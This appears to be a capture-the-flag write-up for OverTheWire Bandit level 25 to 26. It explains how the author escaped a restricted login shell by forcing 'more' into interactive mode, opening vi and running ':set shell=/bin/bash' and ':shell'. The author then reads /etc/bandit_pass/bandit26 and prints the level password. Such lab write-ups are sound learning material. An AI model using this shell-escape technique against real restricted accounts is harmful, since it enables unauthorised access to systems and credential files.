# Bandit Level 25 → Level 26

## 🎯 Objective

The goal of this level is to log in as **bandit26** and retrieve the password for the next level.

The challenge provides an SSH private key in the `bandit25` home directory. However, logging in normally does not give me a regular shell.

Instead, the `bandit26` account uses a custom shell:

```text
/usr/bin/showtext
```

This script runs the `more` command on a text file and then exits.

The main challenge is to exploit the interactive behavior of `more` to access a shell as `bandit26`.

## 🔎 Examining the `bandit26` User

I first checked how the `bandit26` account is configured:

```bash
cat /etc/passwd | grep bandit26
```

The output showed that the default shell for `bandit26` is:

```text
/usr/bin/showtext
```

This means that when I successfully authenticate as `bandit26`, instead of getting a normal Bash shell, the system executes:

```text
/usr/bin/showtext
```

## 📄 Examining `/usr/bin/showtext`

I then read the contents of the script:

```bash
cat /usr/bin/showtext
```

The script contained:

```bash
#!/bin/sh
export TERM=linux
more ~/text.txt
exit 0
```

## 🧠 Understanding the Script

### `#!/bin/sh`

```bash
#!/bin/sh
```

This is the shebang.

It tells Linux to execute the script using the `/bin/sh` shell.

### Setting the Terminal Type

```bash
export TERM=linux
```

This sets the `TERM` environment variable to:

```text
linux
```

The `TERM` variable tells programs what type of terminal they are running inside.

This is useful for programs such as `more` and `vi`, which need to know how to interact with the terminal.

### Running `more`

The most important command is:

```bash
more ~/text.txt
```

`more` is a terminal-based pager.

It displays a file one screen at a time.

Normally, if the entire file fits inside the terminal, `more` finishes immediately.

However, if the file is larger than the available terminal screen, `more` becomes interactive and displays something similar to:

```text
--More--
```

This interactive mode gives us an opportunity to use commands supported by `more`.

### Exiting the Script

After `more` finishes, the script executes:

```bash
exit 0
```

This terminates the shell.

Therefore, under normal circumstances, logging into `bandit26` would immediately show the text file and then disconnect me.

## 🪟 Making `more` Interactive

The key to solving this level is making the terminal small enough that `~/text.txt` does not fit on the screen.

I resized my terminal window vertically until it was only around **4–5 lines high**.

This causes the `more` command to pause instead of displaying the entire file at once.

## 🔐 Connecting as `bandit26`

The `bandit25` home directory contains an SSH private key:

```text
bandit26.sshkey
```

I used this key to connect to `bandit26`:

```bash
ssh -i bandit26.sshkey bandit26@localhost -p 2220
```

The command means:

```text
ssh
│
├── -i bandit26.sshkey
│       Use the specified private SSH key
│
├── bandit26@localhost
│       Connect as the bandit26 user
│
└── -p 2220
        Connect to SSH port 2220
```

Because the terminal was very small, the `more` command became interactive.

Instead of immediately exiting, I reached the `more` interface.

## 🔓 Breaking Out of `more`

While inside the interactive `more` screen, I pressed:

```text
v
```

The `v` command opens the currently displayed file in the configured editor.

This launched the `vi`/`vim` editor.

This is important because `vi` provides a way to execute shell commands.

## ⚙️ Changing the Shell Used by `vi`

Inside `vi`, I entered:

```text
:set shell=/bin/bash
```

and pressed **Enter**.

This changes the shell that `vi` uses when executing shell commands.

The shell is now:

```text
/bin/bash
```

instead of the default shell:

```text
/usr/bin/showtext
```

## 🐚 Spawning a Bash Shell

I then entered:

```text
:shell
```

and pressed **Enter**.

This instructed `vi` to start a shell.

Since I had changed the shell to:

```text
/bin/bash
```

I was given a normal Bash shell.

The important part is that this shell was running with the permissions of:

```text
bandit26
```

Therefore, I had successfully escaped the restrictive `showtext` shell.

The execution chain was:

```text
SSH login as bandit26
        ↓
/usr/bin/showtext
        ↓
more ~/text.txt
        ↓
Press v
        ↓
vi/vim
        ↓
:set shell=/bin/bash
        ↓
:shell
        ↓
Bash shell as bandit26
```

## 🔑 Retrieving the Password

Once I had a normal shell as `bandit26`, I could read the password file:

```bash
cat /etc/bandit_pass/bandit26
```

This returned:

```text
jHdv2ELQhT22BkprMNDjybZDAkw1zeBJ
```

## 🔑 Password

```text
jHdv2ELQhT22BkprMNDjybZDAkw1zeBJ
```

## 🧠 What I Learned

* `/etc/passwd` contains information about user accounts and their configured login shells.
* The shell specified for a user determines what is executed when that user logs in.
* A user does not necessarily have to use Bash as their login shell.
* `more` is a terminal pager that can become interactive when the displayed content does not fit on the screen.
* Making the terminal smaller can force `more` into interactive mode.
* The `v` command in `more` can open the displayed file in an editor.
* `vi`/`vim` can execute shell commands.
* `:set shell=/bin/bash` changes the shell used by `vi`.
* `:shell` launches the configured shell from inside `vi`.
* Even when a user has a restricted login shell, other programs launched with that user's permissions may provide access to a normal shell.
* SSH private keys can be used for authentication instead of passwords.

---

## 📌 Key Takeaway

The main idea of this level was to escape the custom `showtext` shell by taking advantage of the interactive features of `more` and `vi`.

The complete execution chain was:

```text
bandit25
    │
    │ SSH private key
    ▼
bandit26
    │
    ▼
/usr/bin/showtext
    │
    ▼
more ~/text.txt
    │
    │ Small terminal
    ▼
Interactive more
    │
    │ Press v
    ▼
vi/vim
    │
    │ :set shell=/bin/bash
    ▼
Bash configured as vi's shell
    │
    │ :shell
    ▼
Bash shell as bandit26
    │
    ▼
cat /etc/bandit_pass/bandit26
    │
    ▼
Password for Level 26
```

The important commands I used were:

```bash
cat /etc/passwd | grep bandit26
```

```bash
cat /usr/bin/showtext
```

```bash
ssh -i bandit26.sshkey bandit26@localhost -p 2220
```

Inside `more`:

```text
v
```

Inside `vi`:

```text
:set shell=/bin/bash
```

Then:

```text
:shell
```

Finally:

```bash
cat /etc/bandit_pass/bandit26
```

which gave me the password for **Level 26**:

```text
jHdv2ELQhT22BkprMNDjybZDAkw1zeBJ
```